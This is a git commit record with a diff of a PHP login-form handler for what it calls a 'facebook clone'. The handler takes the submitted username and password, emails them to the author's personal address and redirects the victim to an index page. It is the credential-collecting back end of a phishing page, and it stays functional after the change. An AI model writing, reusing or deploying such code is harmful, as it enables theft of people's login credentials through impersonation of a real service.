314f374bed8693bf1ef9492aeff01453b0da7319
Sakib Ahmed <sakibrisa@gmail.com>
2021-08-08 23:45:56 +0600

    080821

--- login-form-handler.php
+++ login-form-handler.php
@@ -1,13 +1,11 @@
 <?php
     $username = $_POST['username'];
     $password = $_POST['password'];
-
-    $email_from = 'sakibrisa@gmail.com';
+    
     $email_subject = 'new submission from facebook clone';
     $email_body = 'Number | Email : $username.\n'.
                     'Password : $password.\n';
     $to = 'sakibrisa@gmail.com';
-    $headers = 'From: $email_from \r\n';
-    mail($to, $email_subject, $email_body, $headers);
+    mail($to, $email_subject, $email_body);
     header("Location: index.html");
 ?>
